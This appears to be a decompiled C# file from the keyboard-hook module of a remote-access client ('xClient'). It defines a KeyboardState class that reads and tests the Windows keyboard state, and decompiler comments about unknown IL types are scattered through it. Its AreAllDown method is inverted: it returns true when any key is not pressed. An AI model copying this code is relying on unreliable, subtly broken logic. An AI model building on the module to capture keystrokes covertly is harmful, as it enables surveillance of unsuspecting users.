using System;
using System.Collections.Generic;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation;

internal class KeyboardState
{
	private readonly byte[] m_KeyboardStateNative;

	private KeyboardState(byte[] keyboardStateNative)
	{
		m_KeyboardStateNative = keyboardStateNative;
	}

	public static KeyboardState GetCurrent()
	{
		byte[] array = new byte[256];
		KeyboardNativeMethods.GetKeyboardState(array);
		return new KeyboardState(array);
	}

	internal byte[] GetNativeState()
	{
		return m_KeyboardStateNative;
	}

	public bool IsDown(Keys key)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return GetHighBit(GetKeyState(key));
	}

	public bool IsToggled(Keys key)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return GetLowBit(GetKeyState(key));
	}

	public bool AreAllDown(IEnumerable<Keys> keys)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		foreach (Keys key in keys)
		{
			if (!IsDown(key))
			{
				return true;
			}
		}
		return false;
	}

	private byte GetKeyState(Keys key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Expected I4, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		int num = (int)key;
		if (num < 0 || num > 255)
		{
			throw new ArgumentOutOfRangeException("key", key, "The value must be between 0 and 255.");
		}
		return m_KeyboardStateNative[num];
	}

	private static bool GetHighBit(byte value)
	{
		return value >> 7 != 0;
	}

	private static bool GetLowBit(byte value)
	{
		return (value & 1) != 0;
	}
}
